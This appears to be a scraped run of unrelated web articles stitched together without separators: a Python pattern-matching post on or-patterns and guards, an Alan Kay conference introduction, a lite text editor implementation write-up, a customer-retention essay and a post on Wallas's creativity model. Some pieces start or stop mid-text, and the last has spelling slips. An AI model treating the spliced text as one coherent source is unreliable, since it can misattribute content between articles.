    <span>case</span> <span>Cat</span><span>(</span><span>age</span><span>=</span><span>3</span><span>)</span> <span>|</span> <span>Dog</span><span>(</span><span>name</span><span>=</span><span>"Fido"</span><span>):</span>
      <span>return</span> <span>True</span>
    <span>case</span> <span>_</span><span>:</span>
      <span>return</span> <span>False</span>

<span>print</span><span>(</span><span>couldBeMyPet</span><span>(</span><span>Cat</span><span>(</span><span>3</span><span>)))</span>
<span># prints True
</span>
<span>print</span><span>(</span><span>couldBeMyPet</span><span>(</span><span>Dog</span><span>(</span><span>"Rover"</span><span>)))</span>
<span># prints False
</span></code></pre></div></div>

<h2 id="pattern-guards">Pattern guards</h2>

<p>Pattern guards are boolean expressions that can be included in a <code>case</code> branch; the case branch is only taken if the pattern guard evaluates to true.</p>

<div><div><pre><code><span>def</span> <span>classify</span><span>(</span><span>pet</span><span>):</span>
  <span>match</span> <span>pet</span><span>:</span>
    <span>case</span> <span>Cat</span><span>(</span><span>age</span><span>=</span><span>age</span><span>)</span> <span>if</span> <span>age</span> <span>%</span> <span>2</span> <span>==</span> <span>0</span><span>:</span>
      <span>print</span><span>(</span><span>"This cat has an even age!"</span><span>)</span>
    <span>case</span> <span>Dog</span><span>(</span><span>name</span><span>=</span><span>name</span><span>)</span> <span>if</span> <span>sorted</span><span>(</span><span>name</span><span>)</span> <span>==</span> <span>list</span><span>(</span><span>name</span><span>):</span>
      <span>print</span><span>(</span><span>"This dog's name is in alphabetical order!"</span><span>)</span>
    <span>case</span> <span>_</span><span>:</span>
      <span>print</span><span>(</span><span>"I have nothing interesting to say about this pet."</span><span>)</span>

<span>classify</span><span>(</span><span>Cat</span><span>(</span><span>4</span><span>))</span>
<span># prints "This cat has an even age!"
</span>
<span>classify</span><span>(</span><span>Dog</span><span>(</span><span>"abe"</span><span>))</span>
<span># prints "This dog's name is in alphabetical order!"
</span>
<span>classify</span><span>(</span><span>Dog</span><span>(</span><span>"fido"</span><span>))</span>
<span># prints "I have nothing interesting to say about this pet."
</span></code></pre></div></div>

<p>In the above example, <code>if age % 2 == 0</code> and <code>if sorted(name) == list(name)</code> are pattern guards that allow that case to be taken only if that boolean expression evaluates to True.</p>

<h2 id="the-surprising-interaction">The surprising interaction</h2>

<p>What do you think this function does?</p>

<div><div><pre><code><span>def</span> <span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>pet1</span><span>,</span> <span>pet2</span><span>):</span>
  <span>match</span> <span>(</span><span>pet1</span><span>,</span> <span>pet2</span><span>):</span>
    <span>case</span> <span>(</span><span>Cat</span><span>(</span><span>age</span><span>=</span><span>age</span><span>),</span> <span>_</span><span>)</span> <span>|</span> <span>(</span><span>_</span><span>,</span> <span>Cat</span><span>(</span><span>age</span><span>=</span><span>age</span><span>))</span> <span>if</span> <span>age</span> <span>%</span> <span>2</span> <span>==</span> <span>0</span><span>:</span>
      <span>return</span> <span>True</span>
    <span>case</span> <span>_</span><span>:</span>
      <span>return</span> <span>False</span>

<span>print</span><span>(</span><span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>Cat</span><span>(</span><span>2</span><span>),</span> <span>Cat</span><span>(</span><span>4</span><span>)))</span>
<span># prints True
</span>
<span>print</span><span>(</span><span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>Cat</span><span>(</span><span>2</span><span>),</span> <span>Cat</span><span>(</span><span>5</span><span>)))</span>
<span># prints True
</span>
<span>print</span><span>(</span><span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>Cat</span><span>(</span><span>5</span><span>),</span> <span>Cat</span><span>(</span><span>4</span><span>)))</span>
<span># prints False (?????)
</span></code></pre></div></div>

<p>The last one (<code>doesEitherCatHaveAnEvenAge(Cat(5), Cat(4))</code>) may seem like it should evaluate to True. After all, the one of the patterns in the or-pattern seems like it matches the second cat, which is a cat with an even age.</p>

<p>Does <code>(Cat(5), Cat(4))</code> match against <code>(Cat(age=age), _) | (_, Cat(age=age)) if age % 2 == 0</code>? To answer this question, the semantics in your head might look something like this:</p>

<ol>
  <li>Well, <code>(Cat(5), Cat(4))</code> does match agains the first pattern of the or-pattern, <code>(Cat(age=age), _)</code>. This match binds the value 5 to the variable <code>age</code>.</li>
  <li>Now we check the guard <code>if age % 2 == 0</code>. Because <code>5 % 2 == 0</code> evaluates to False, this check fails.</li>
  <li>Go back to the or-pattern and see if there’s any other way to match it. In this case, <code>(Cat(5), Cat(4))</code> also matches the second pattern of the or-pattern, <code>(_, Cat(age=age)</code>. This binds the value 4 to the variable <code>age</code>.</li>
  <li>Now the guard <code>if age % 2 == 0</code> succeeds, because <code>4 % 2 == 0</code> evaluates to <code>True</code>.</li>
  <li>Because this case matches the value, we return True.</li>
</ol>

<p>This is perfectly sensible, but this is not what the implementation does. The implementation’s semantics are more like this:</p>

<ol>
  <li>Same as step 1 from above.</li>
  <li>Same as step 2 from above.</li>
  <li>Because the guard failed, the case isn’t taken! Instead, the next case is tried. This case (<code>case _:</code>) always succeeds, so we return False.</li>
</ol>

<p>In other words, pattern matching does’t have backtracking semantics, even if a value can match an or-pattern in multiple different ways.</p>

<p>I love pattern matching, and I’m excited to see that it might be adopted by such a popular language as Python. But this particular interaction of features might confuse novices. Let’s compare the approaches of other languages.</p>

<p>OCaml has the same semantics as Python here, but the OCaml compiler can emit a warning (because the compiler has enough type information to figure out whether the constituent patterns of an or-pattern can possibly match the same value in different ways).</p>

<div><div><pre><code><span>let</span> <span>()</span> <span>=</span>
  <span>match</span> <span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span> <span>with</span>
  <span>|</span> <span>(</span><span>x</span><span>,</span> <span>_</span><span>)</span> <span>|</span> <span>(</span><span>_</span><span>,</span> <span>x</span><span>)</span> <span>when</span> <span>x</span> <span>=</span> <span>2</span> <span>-&gt;</span> <span>print_endline</span> <span>":)"</span>
  <span>|</span> <span>_</span> <span>-&gt;</span> <span>print_endline</span> <span>":("</span>
<span>;;</span>
</code></pre></div></div>

<p>This prints <code>:(</code>, but also emits the warning:</p>

<div><div><pre><code>Warning 57: Ambiguous or-pattern variables under guard;
variable x may match different arguments. (See manual section 9.5)
</code></pre></div></div>

<p>Rust has pattern matching and guards, and has an experimental <code>or_patterns</code> feature. It implements backtracking semantics, unlike Python. This is weird in its own right, especially in the presence of side effects. Take a look at this program:</p>

<div><div><pre><code><span>#![feature(or_patterns)]</span>

<span>// Prompt the user whether they want to accept the match</span>
<span>pub</span> <span>fn</span> <span>check</span><span>(</span><span>x</span><span>:</span> <span>i32</span><span>)</span> <span>-&gt;</span> <span>bool</span> <span>{</span>
    <span>use</span> <span>std</span><span>::</span><span>io</span><span>::{</span><span>stdin</span><span>};</span>
    <span>println!</span><span>(</span><span>"Checking this match: {}. Should we accept it? y/n"</span><span>,</span> <span>x</span><span>);</span>
    <span>let</span> <span>mut</span> <span>s</span> <span>=</span> <span>String</span><span>::</span><span>new</span><span>();</span>
    <span>stdin</span><span>()</span><span>.read_line</span><span>(</span><span>&amp;</span><span>mut</span> <span>s</span><span>)</span><span>.expect</span><span>(</span><span>"Did not enter a correct string"</span><span>);</span>
    <span>return</span> <span>s</span><span>.trim</span><span>()</span> <span>==</span> <span>"y"</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>match</span> <span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span> <span>{</span>
        <span>(</span><span>x</span><span>,</span> <span>_</span><span>)</span> <span>|</span> <span>(</span><span>_</span><span>,</span> <span>x</span><span>)</span> <span>if</span> <span>check</span><span>(</span><span>x</span><span>)</span> <span>=&gt;</span> <span>{</span>
            <span>println!</span><span>(</span><span>":)"</span><span>)</span>
        <span>}</span>
        <span>_</span> <span>=&gt;</span> <span>{</span>
            <span>println!</span><span>(</span><span>":("</span><span>)</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>In particular, the guard can now run multiple times:</p>

<div><div><pre><code>$ cargo +nightly run
Checking this match: 1. Should we accept it? y/n
n
Checking this match: 2. Should we accept it? y/n
y
:)
</code></pre></div></div>

<p>I’m not sure what the right decision is for Python. Or-patterns and guards may just not compose well.</p>

<div>
<p>This summer we were due to hold our XT20 conference, which was going to focus on
how we could bring some of the approaches of the past to tackle the challenges
of the present and the future. Unfortunately, one of these future challenges
arrived, and we had to make the difficult decision to cancel the event.</p>
<p>Alan Kay was one of the leading researchers at the legendary labs of ARPA and
Xerox PARC in the 1960s and 1970s. We wanted to understand from Alan how Xerox
PARC came to be, and how could possibly reproduce what happened there, to make
similar leaps for our industry in the future.</p>
<p>When we held our XT16 conference, we made short videos with all of our speakers
to introduce their talks, and we wanted to continue this tradition with XT20. So
prior to the cancellation, we recorded a short piece with Alan to introduce the
content of his talk.</p>
<p>Alan stresses that we’re only just at the start of our industry and
that we’ve a long way to go. As he puts it, many of great ideas from
the 1960s and 1970s are still landing, before we consider the new
ground-breaking ideas that are yet to be found. To find those ideas,
we need to seek out the brightest among us, and then we have to figure
out how to fund and manage them properly.</p>
<div>
<p>

</p>
</div>
<div>
<blockquote>
<p>I got asked to give a talk at XT20 because I was one of the researchers and a
leader of a research group in the ARPA and Xerox combined research community in
the sixties and the seventies that invented many of the technologies that are in
use today including the ones that we’re using right now, these include: Personal
Computing; The Graphic User Interface; Ethernet; The Internet; Laser Printing;
Client/Server computing, and a host of other ones.</p>
<p>And so this was not just a series of inventions but was actually the creation of
several really large industries that have, according to the Wall St. Journal,
have returned about 45 trillion (US dollars) to the world, and the four largest
capital net-worth companies in America all used, are based on, these
technologies, so besides being good ideas, besides being something that can
boost human intellect and can deal with much more complicated situations, it
also has been a tremendous commercial success far beyond normal R&amp;D efforts.</p>
<p>One point of interest, I think, to people is that despite this, <strong>no country or
company or Univerisity is willing to fund such an effort!</strong>. The key is: can you
get the right people, and can you set up something that allows the researchers
and the right researchers to do the kind of stuff that normally was only done
when countries felt that they were in the middle of a war.</p>
<p>That’s the second point, there have been many such efforts, successful efforts,
such as ARPA and Xerox PARC in the past, especially in the US, and the Cold War,
and then back in WWII, and the particular way of going about it actually traces
back to the combined joint work of the UK and the US in developing Radar for
WWII. There’s a direct link in the methodologies used back then, and to an
extent in projects that are not so directly involved such as Bletchley Park (in
the UK) and Los Alamos and the Atomic Bomb effort (in the US).</p>
<p>So I think what will be of interest to the people who go to this conference will
likely be the idea first that it really can be done, and <em>has</em> been done (more
than once).</p>
<p>Most normal regular people are quite against taking what seems to be a huge risk
but in fact, the pay-off from these risks, which is actually only been a few
hundred million (GB) pounds or so, has been in the trillions!</p>
<p>So if you count up all the zeros the return on investment is not 15% but more like 20,000%,
so it actually would make good business sense for people to take these kinds of
risks, but that isn’t the way business people think. And so this is, I think, a
really interesting area to explore and that’s what I will at least open the
door to in my talk.</p>

<p>2020.06.04</p>
<p>updated: 2020.06.06</p>



<p>
  This write-up outlines some of the implementation details of the
  <a href="http://github.com/rxi/lite">lite</a> text editor. At the time of writing
  this lite is version <a href="https://github.com/rxi/lite/releases/tag/v1.06">1.06</a>.
</p>


<p>
  Lite is written mainly in Lua (5.2) with the lowest level parts written in C.
  It is written with the intent of being lightweight, easy on the eyes,
  responsive and trivial to modify and extend. To achieve this the core
  implementation aims to be <em>as simple as possible</em>: complexity is only
  brought in when it's proven the simplest method isn't practical.
</p>



<p>
  The core of lite implements documents, syntax highlighting, a
  cooperative-threading system, basic logging and the general ui layout system.
  Overall the core is in charge of handling user input, running per-frame tasks,
  and rendering the resultant frame early enough to meet the frames-per-second
  specified in <code>config.fps</code>.
</p>



<p>
  Lite implements a cooperative-threading system where by background tasks —
  such as full-document syntax highlighting and updating the internal list of
  project files — can be performed incrementally. Cooperative threads in lite are
  implemented using lua's coroutines and are referred internally as simply
  <code>threads</code>.
</p>
<p>
  A thread can be started by using the <code>core.add_thread()</code> function, this
  function takes a function, and an optional object which is used as a weak
  reference to that thread, eg. if a doc is passed as the weak reference, when
  that doc is garbage collected the coinciding thread will also cease to exist.
</p>
<p>
  As threads in lite are cooperative they're expected to regularly call
  <code>couroutine.yield()</code>. Typically this yielding is done every <code>n</code>
  lines for line-based tasks (eg. full-project search, syntax highlighting).
  When a thread yields the core will continue to render the frame, or — if there is
  still enough time left in the current frame — pass control to another thread.
  Threads can also pass a numerical argument to <code>coroutine.yield()</code> to wait
  for the number of seconds specified:
</p>
<pre>core.add_thread(function()
  -- print "hello world" every 10 seconds
  while true do
    print("hello world")
    coroutine.yield(10)
  end
end
</pre>
<p>
  Practical usage examples of lite's threading can be seen in the core's project
  file scanning (<code>data/core/init.lua</code>) and the incremental syntax highlighting
  (<code>data/core/doc/highlighter.lua</code>).
</p>


<p>
  All loaded text files in lite are stored in <code>Docs</code>. A doc keeps a table
  of a text file's lines (<code>Doc.lines</code>), undo and redo
  state, the current syntax (<code>Doc.syntax</code>), syntax highlighting state
  (<code>Doc.highlighter</code>) and caret/selection state. Docs are opened using the
  <code>core.open_doc()</code> function; if the function is called and a doc of that
  filename is already open then the existing doc is returned such that
  more-than-one doc representing the same file should never be present.
</p>
<p>
  Lite stores all the open docs in the <code>core.docs</code> table; each frame lite
  checks the number of views referencing each doc and releases those with zero
  references — this is an instance of lite favoring polling over callbacks or
  event listeners. This approach is done throughout lite; in avoiding event
  listeners we also avoid having to manage unregistering event handlers or worry
  about having those which are never unregistered through error. This leads to
  much simpler, less error-prone code.
</p>

<p>
  Lite implements a simple syntax highlighter based around lua patterns, this is
  split up into 3 parts:
</p>
<ul>
  <li><code>core.syntax</code>: stores language syntax specifications</li>
  <li><code>core.tokenizer</code>: converts text into table of tokens using a given syntax</li>
  <li><code>core.doc.highlighter</code>: stores token state for lines of a doc and handles
         full-document incremental highlighting</li>
</ul>
<p>
  A language syntax is stored as a table of lua patterns mapped to to their
  resultant token type (<code>.patterns</code>) and a table of symbols mapped to their
  token type (<code>.symbols</code>). Patterns in the pattern table can also be a
  range of the following format:
</p>
<pre>{ range_start_pattern, range_end_pattern [, escape_character] }
</pre>
<p>
  Ranges can be used for matching strings:
</p>
<pre>{ '"', '"', '\\' }
</pre>
<p>
  An example of syntax specifications can be seen in any of the
  <code>data/plugins/language_*.lua</code> files.
</p>
<p>
  The highlighter persists range state between lines by storing the pattern
  table index of the current range. As the highlighter works in increments of
  lines, ranges are useful for multi-line comments or strings which a single
  pattern would fail on.
</p>
<p>
  When the <code>tokenizer.tokenize()</code> function is called it iterates the syntax's
  pattern table from top to bottom, such that patterns higher up in the table
  take precedence. When it matches a pattern it pushes the token to the
  resultant table, if the token's content matches any of the keys in the
  <code>.symbols</code> table that value is used instead of the matched token value;
  this acts both as a more convenient way of specifying keywords as well as an
  optimization as the tokenizer can attempt matching fewer patterns, even if
  there are many keywords specified. The function returns a <code>state</code> integer
  which is used to indicate which pattern range it is currently inside if it is
  inside any.
</p>
<p>
  <code>core.doc.highlighter</code> is in charge of providing tokenized lines when
  displaying a document; each doc stores a <code>Highlighter</code> object. The
  highlighter assures highlighting information for any line that is requested
  is <em>always</em> available, even if the full-document incremental highlighter
  has not yet reached that line.
</p>
<p>
  When a request is made to the highlighter for a specific line the highlighter
  first checks its cache for the line; if it does not have the line cached —
  or, if the line's text has changed since its cached version — it immediately
  tokenizes the line, continuing from the tokenizer state left from the
  previous line. The highlighter's <code>max_wanted_line</code> field is set to
  that line's value if it's greater than the existing <code>max_wanted_line</code>.
</p>
<p>
  A doc's highlighter creates a thread when it's created which it uses to do
  full-document highlighting starting from its <code>first_invalid_line</code> up
  until the <code>max_wanted_line</code>. When a change occurs in a document the
  <code>first_invalid_line</code> is set to the first line of the change if it's
  greater than the current <code>first_invalid_line</code>.
</p>
<p>
  This implementation results in the following characteristics:
</p>
<ul>
  <li>Displayed lines are always syntax highlighted with, at the very
         least, highlighting which is valid to the current screen's content</li>
  <li>Displayed lines are <em>eventually</em> highlighted with
         full-document aware highlighting</li>
  <li>The highlighting is performed per-line, and so — with the exception
         of extremely long lines — can be done incrementally without a
         negative effect on responsiveness</li>
  <li>Highlighting is only performed up until the point in the document it
         is required, for example, up until the last visible line</li>
</ul>



<p>
  Each part of lite's UI is implemented as a <code>View</code>, that is, a document is
  shown in the UI as a <code>DocView</code>, the status bar at the bottom the
  <code>StatusView</code> etc. Each view exists within the <code>RootView</code>
  (<code>core.root_view</code>) which is in charge of calling the <code>:update()</code> and
  <code>:draw()</code> functions of each view, managing the layout of the
  views, and routing user input to relevant views.
</p>
<p>
  The rootview is implemented as a binary tree of <code>Nodes</code>. Each node is one
  of the following types:
</p>
<ul>
  <li><code>hsplit</code>: Contains two children side-by-side and a divider between them</li>
  <li><code>vsplit</code>: Contains two children one-above-the-other and a divider between them</li>
  <li><code>leaf</code>: Contains one or more views, and, if there is more than one
        view, a tab at the top for each view.</li>
</ul>
<p>
  Each frame the rootview calculates its layout based on the divider position of
  each split and sets the <code>.size</code> field of each node and view accordingly.
</p>
<p>
  The rootview also has a concept of <em>locked nodes</em>; the size of a locked
  node is not determined by the divider position but instead is set from the
  view's <code>.size</code> field. Locked nodes cannot be resized by the user as
  normal nodes would be, they cannot be closed and cannot open additional views.
  The locked-node feature is used for, amongst other things, the status bar at the
  bottom of the screen which we typically want to be always present and
  immutable.
</p>
<p>
  lite takes the approach of effectively redrawing <em>everything</em> whenever
  it needs to redraw <em>anything</em>, this lends itself to simplified UI code.
  There are no event listeners or callbacks to manage. If something changes the
  state of the UI (eg. the caret is moved), the <code>core.redraw</code> boolean is set
  to <code>true</code> to signify that something has changed and the UI is redrawn on
  that frame. For further simplicity any user input events will also set
  <code>core.redraw</code>, such that there's a guarantee any change which resulted from
  user input will result in the screen contents being updated.
</p>
<p>
  Although the idea of redrawing everything each time may appear wasteful, lite
  employs a technique where by only regions of the screen which have changed
  between frames are actually redrawn — these regions can be displayed by calling
  <code>renderer.show_debug(true)</code>. This technique is implemented on the C level
  of the code and is invisible to the lua portion which acts as if it's doing
  a full redraw each time.
</p>
<p>
  An overview of how this is achieved is detailed in the
  <a href="https://rxi.github.io/cached_software_rendering.html">Cached Software Rendering</a> write-up.
</p>



<p>
  Lite's plugin system is based around lua's module system; each plugin is
  simply a lua module (that is, a single <code>.lua</code> file, or, a directory
  containing a <code>init.lua</code> file). All modules in the <code>data/plugins</code>
  directory are automatically loaded when lite starts — this is done after
  initializing the core and before loading the user and project modules. Thus to
  install a plugin you simply place the file in the plugins directory; to
  uninstall a plugin you delete the file.
</p>
<p>
  A specific order of which plugins are loaded is not guaranteed by lite but,
  as plugins are just regular lua modules, a plugin can simply call <code>require</code>
  on another plugin if it needs to assure that …</p></div>

<p>When it comes to customer relationships, momentum is on your side: it is much easier to retain a customer than it is to find a new one. Once the initial inertia is surpassed, the effort that needs to be put into keeping a customer is significantly lower than acquiring and onboarding another customer. And a churned customer is a double loss: not only do you have to find a new customer to replace them. To grow, you will need to find two new customers. That’s why customer retention is of utmost importance to grow a business reliably.</p>



<p>This focus on retaining a customer at all costs is somewhat new. Before the subscription economy, a repeat customer was a nice-to-have, but most of the time, the relationship with the customer was over after the first transaction. Processes were optimized to get the customer through the order process and stop them from abandoning their cart. But once they ordered, it was over.</p>



<p>The membership economy is very different. Customer retention is more important than getting new customers, as churn is the silent killer. Retention can be measured in renewal or cancellation rates, and keeping it as close to 100% as possible will decide if your business is sustainable or not.</p>



<p>Luckily, there are several proven strategies to increase retention, and they all center around your relationship with your customers.</p>



<p><strong>Value Nurturing</strong></p>



<p>Value nurturing strategies increase the customer’s perceived value of your product, making the cancellation feel like a more significant loss. Showing your customers how much they benefit from your product will make them stick around longer.</p>



<p>Your goal is to over and over again confirm your customers’ belief that choosing your service was a smart choice. Not only does it have to feel right, but it should also clearly be a good economic decision, both on their first day and right now.</p>



<p>In an ideal world, customers would continuously notice what a fantastic product you provide them with. They would flood your customer service channels with thank you messages, and they would write long blog posts about how everyone should be a customer of your business, forever. Sadly, life gets in the way, and other things are much more important to your customers.</p>



<p>That’s why it’s up to you to show them what they get. Show them their progress, how much they have improved ever since they used your service. Show them how well they do compared to other users, how much impact your service has in their lives. In short: make the value they receive visible to them inside your product and in your communication.</p>



<p>It’s not only limited to this, though. The goal is to retain a customer, and showing them what they get is just one way of keeping them around. You want your product to be something they depend on. When times are tough, you want your service to be the last one to be canceled. This is best accomplished by creating voluntary dependency: offer something that your customers want to depend on. Provide so much value compared to the alternatives that they willingly take the risks inherent in every choice of using an external product.</p>



<p>A word about value: we are not just talking about your revenue here. For your customers to stick around, your business needs to provide them with benefits and advantages every single time they use it. Your customer lifetime value is inextricably linked to the perceived value of your customers.&nbsp;</p>



<p>Here’s the trick to customer success: increasing their revenue will increase yours. Make them successful, help them grow the lifetime value of their customers, and their LTV will expand as well.</p>



<p><strong>Expectation Management</strong></p>



<p>Managing expectations is a significant factor too. Being able to occasionally over-deliver will delight your customers as it is an unexpected bonus. I’m not saying you should consistently undersell your product. But surprising a customer with something good they didn’t expect is a rare occurrence in the business world. Those who succeed at that will be remembered.</p>



<p>Customers will tell a few people about a positive experience, but they will tell a few dozen about a negative one. Keeping customers above the baseline will reduce the chance of them ranting to their peers, who may often be potential customers.</p>



<p>Every impression counts. At any touchpoint, you can synchronize expectations. Find out what your customers are concerned with and adjust your priorities when expectations change. From your customer’s perspective, it’s a magical thing to see a feature suggestion become an actual feature.&nbsp;</p>



<p>The level of trust in the brand and the decisions you make are incredibly important for renewal. By aligning what your customers expect you to do with your actions, trust grows, and value generation will happen along with the expectations of your customers.</p>



<p>Those expectations change over time. In the beginning, customers often have to find their footing, and they expect ease of use and being able to integrate your product into their workflow. After a few years, focus shifts to perceived value, as your service has become a regular part of your customers’ work routine. Unless they’re really needed, customers will ask less and less for new features, and they will shift their focus onto existing parts of your offer and how the current set of features can be improved even more.</p>



<p>Throughout a customer’s lifetime, get a feel for the acceptance of and desire for self-service in your customer base. In the beginning, you can respond to every support query yourself. When you scale, more of your support will shift towards more asynchronous and self-help solutions. It’s important to take your customers with you on that journey. The early adopter that you talked to every few days through your real-time chat will have to understand that your attention is more divided. Their expectations will need to change with your structural changes.</p>



<p><strong>Find the At-Risk-of-Leaving Customers</strong></p>



<p>In the best case, a customer stays with you for many years. They love your product, their very wishes come true every time, and they become catalysts for your marketing.&nbsp;</p>



<p>This is, of course, utopian. Every single customer of yours has different problems and hardships, and what works for one may not work for the other. Inevitably, at some point, a few customers will think about canceling. If you want your retention to remain high, there are two things you can do:</p>



<p><strong>Convince them to stay before leaving.</strong>&nbsp;The hard part is to figure out who is about to leave. You can track people clicking the button that starts the cancellation process and trigger a customer service conversation. Tag this customer as someone who should receive a follow-up email asking what you can do for them. You can track other things than clear cancellation intent: do they stop using the product for a long time? Stay clear of acting too quickly, as this is often a result of vacation, maternal leave, or just other priorities. But it is worth measuring so that you have an indicator you can use to inform your communication strategy.</p>



<p><strong>Convince them to come back after they leave.</strong>&nbsp;This is your last chance to retain them as a customer. After someone cancels, give them a grace period of a few days or hours, but re-engage them. Depending on how shameless you want to be, ask them to return with a free month, or even extend them the offer of a lifetime discount for returning on a paid subscription. As long as it fits into your economic calculations, keeping a customer is worth more than losing them, even with reduced revenue.</p>



<p>There is a difference in what makes customers leave, and it is connected to how long they have been with you. Early customers are more likely to quit because of lower switching costs and less dependency on your service within their established workflows. They’re more jittery, so expect their cohorts to cancel more. Long-term customers quit for different reasons: either their perceived value decreases or the problem-solution-fit of your service is misaligned. Take your customer size and age into account when you craft your messaging for each cohort, and find something that works for each of them.</p>



<p><strong>Actionable Retention</strong></p>



<p>Here are a few things we did at FeedbackPanda to keep customer retention as high as possible.</p>



<p>Staying in touch with your customers will keep them engaged. Offer a weekly newsletter to expose them to things that happened in their industry will do two things: first, it will associate your business with a trusted source of information, and it will also show that you know what you’re talking about. Building trust and reputation goes a long way toward retaining a customer.</p>



<p>Tighten and focus your onboarding. A customer who “gets it” quickly after signing up will stay with you longer and think of your business as a dependable service. If you can reduce the number of steps until your prospective customer reaches the “a-ha” effect, go for it. There is nothing better than a customer telling their peers that your service is “a no-brainer.”&nbsp;</p>



<p>Do things that don’t scale. Send a postcard. Delight your customers with surprises on their birthdays. Send them a gift after they’ve been with you for a year. Host a meetup in the city where most of them live. Surprise them in ways that other businesses can’t — and wouldn’t. Not only will this make those customers stick around, but word will travel, and you will benefit from your customers sharing their delight and surprise with each other. When we had our first one hundred customers, we sent out postcards to all of them. A lot of customers shared photos of receiving those postcards in the mail, and consequently, a lot of prospects signed up for our service.</p>



<p>Ask your customers for testimonials. Use them on your marketing site, in app-stores, or any other platform where they can share it with their peers. This gives you reputation and your customer a feeling of being appreciated; after all, they …</p></div></div>

<![CDATA[Creative Problem Solving – Wallace Model from 1926]]>

July 2, 2020 | https://ghinda.com/blog/creativity/2020/wallace-model-of-creative-problem-solving.html | <a href="https://web.archive.org/web/*/https://ghinda.com/blog/creativity/2020/wallace-model-of-creative-problem-solving.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Graham Wallas was a social phycologist and founder of the London School of Economics, and he was the first one to propose a first complete model of a creative process. He described this model in 1926 in the book named “The Art of Thought”.</p>

<p>There he includes the three stages identified by Hermann von Helmholtz (a German physician and physicist) in 1891 - preparation, incubation, and Illumination - and adds a fourth one - Verification.</p>

<blockquote>
  <p>In the daily stream of thought, these four different stages constantly overlap as we explore different problems</p>
</blockquote>

<p>I will try to describe below a little bit about the original process, and then at the end, you will find some hints of how to support better each phase taken from a Ph.D. thesis written by Arendse, Sedick and named “Evaluating and implementing a deliberate creativity framework to enhance retail business performance” - read it all here if you want: <a href="https://repository.nwu.ac.za/handle/10394/12232?show=full" target="_blank" rel="noopener">https://repository.nwu.ac.za/handle/10394/12232?show=full</a>.</p>

<p>Let’s start.</p>

<p><img src="https://ghinda.com/blog/assets/images/articles/wallace-creative-problem-solving.png" alt="Wallace Creative Problem Solving"></p>
<hr>
      <h3 id="preparation">
        
        
          Preparation <a href="#preparation">#</a>
        
        
      </h3>

<p>Preparation focuses on learning and understanding to gather information and define the problem and its requirements.</p>

<p>Here are some key points from Wallace about this stage:</p>
<ul>
  <li>The problem should “be investigated in all directions.”</li>
  <li>The process should be a <em>“hard, conscious, systematic, and fruitless analysis of the problem”</em>.</li>
  <li>Acquire as many facts as possible and try to memorize them so that later you will be able to form associations quickly. 
&amp; A possible way of handing this preparation is to follow up on multiple propositions.</li>
</ul>

<p>A great quote from Wallas regarding this stage is:</p>

<blockquote>
  <p>Our mind is not likely to give us a clear answer to any particular problem unless we set it a clear question, and we are more likely to notice the significance of any new piece of evidence or new association of ideas if we have formed a definite conception of a case to be proved or disproved</p>
</blockquote>

<p>Some great additions from Arendse thesis regarding the implementation of Wallace model, especially when working with groups are:</p>
<ul>
  <li>Shared space for participants to put and access information</li>
  <li>Defining and clarifying group objectives</li>
  <li>Allowing a mix of public and non-public areas for participants to work.</li>
</ul>
    <hr>
      <h3 id="incubation">
        
        
          Incubation <a href="#incubation">#</a>
        
        
      </h3>

<p>Incubation is where the participant will not focus on the problem, but do any other non-demanding tasks (like sleeping, walking, listening to music, etc.). In contrast, the subconscious will focus on solutions.</p>

<p>Critical points from Wallace about this:</p>
<ul>
  <li>This stage should include a large amount of mental relaxation.</li>
  <li>The mental relaxation should include a certain amount of physical exercise (<em>“walking in the woods”</em>, <em>“a stroll over hill and dale”</em>)</li>
  <li>Should be aware that sometimes substituting mental relaxation or physical exercise with reading books could negatively affect the creative process. Some other times reading books - especially literature - could help.</li>
</ul>

<p>Key points from Arendse:</p>
<ul>
  <li>Do something different by switching to various tasks or unwinding.</li>
  <li>Depending on their profile, some people might work individually and others in groups.</li>
  <li>Perceptual indicators help this process: people should remain in the space where there is around the information about the subject.</li>
</ul>
    <hr>
      <h3 id="illumination">
        
        
          Illumination <a href="#illumination">#</a>
        
        
      </h3>

<p>Illumination is when the participant will become aware of one or many solutions to the problem. Wallace calls Intimation the moment that precedes and accompanies the flash of Illumination.</p>

<p>When talking about Intimation, one of the best descriptions was written by McMurry in the book <em>“How to Study”</em>:</p>

<blockquote>
  <p>“Many of the best thoughts, probably most of them, do not come, like a flash, fully into being but find their beginnings in dim feelings, faint intuitions that need to be encouraged and coaxed before they can be surely felt and defined.”</p>
</blockquote>

<p>Key points from Wallace:</p>
<ul>
  <li>Try to take precautions so that you will not be interrupted when the train of associations starts.</li>
  <li>Do not try to conclude and putting it into works too early in your train of associations.</li>
  <li>Sometimes you can start the Illumination by rereading some work that you did in the preparation phase.</li>
</ul>

<p>Wallace quotes here Henry Hazlitt who wrote in a book named <em>“Thinking as a science”</em> this beautiful passage:</p>
<blockquote>
  <p>“Thoughts of certain kinds are so elusive that to attempt to articulate them is to scare them away, as a fish is scared by the slightest ripple. When these thoughts are in embryo, even the infinitesimal attention required for talking cannot be spared.”</p>
</blockquote>
    <hr>
      <h3 id="verification">
        
        
          Verification <a href="#verification">#</a>
        
        
      </h3>

<p>Verification (or Elaboration and Evaluation) is when the participant will evaluate if the solution is viable and satisfy the problem’s requirements. 
Wallace says that verification is not too different that Preparation and defined Verification as a process where <em>“the validity of the idea was tested, and the idea itself was reduced to exact form”</em>.</p>
    <hr>
      <h3 id="about-the-creativy-process">
        
        
          About the creativy process <a href="#about-the-creativy-process">#</a>
        
        
      </h3>

<p>I find this book inspirational and very forward-thinking, taking into consideration that Wallace wrote it in 1926.</p>

<p>Among some interesting ideas, I take from Art of Though it that the creative process has an important component that lives into the subconscious and cannot be easily controlled. Still, some things might help the mind to come to an Illumination.</p>

<p>Here is what he says about how we arrive at a new idea:</p>
<blockquote>
